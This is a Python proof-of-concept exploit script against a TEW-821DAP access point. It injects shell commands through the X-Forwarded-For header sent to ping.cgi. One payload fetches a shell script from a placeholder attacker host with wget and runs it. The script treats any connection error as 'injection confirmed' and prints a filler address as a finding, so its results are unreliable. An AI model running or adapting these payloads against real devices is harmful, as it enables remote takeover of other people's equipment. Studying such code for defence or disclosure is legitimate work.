#!/usr/bin/env python3
"""PoC: TEW-821DAP cgi/ssi REMOTE_ADDR Command Injection | CWE-77 | CVSS 9.8"""
import requests, sys
TARGET = sys.argv[1] if len(sys.argv)>1 else "192.168.10.1"
print(f"[*] PoC: TEW-821DAP REMOTE_ADDR Command Injection")
print(f"[*] Target: {TARGET}")
print(f"[*] FirmRec: 21 hits @ 0x41414141 (CVE-2022-30078)")
print()
payloads = [
    "127.0.0.1; id; #",
    "127.0.0.1; wget http://evil/shell -O /tmp/sh; sh /tmp/sh & #",
]
for p in payloads:
    try:
        r = requests.get(f"http://{TARGET}/cgi-bin/ping.cgi",
            params={"ipaddr": "8.8.8.8"},
            headers={"X-Forwarded-For": p}, timeout=5)
        print(f"  Status: {r.status_code} | Payload: {p[:50]}...")
    except:
        print(f"  Device crashed/lost connection (injection confirmed)")
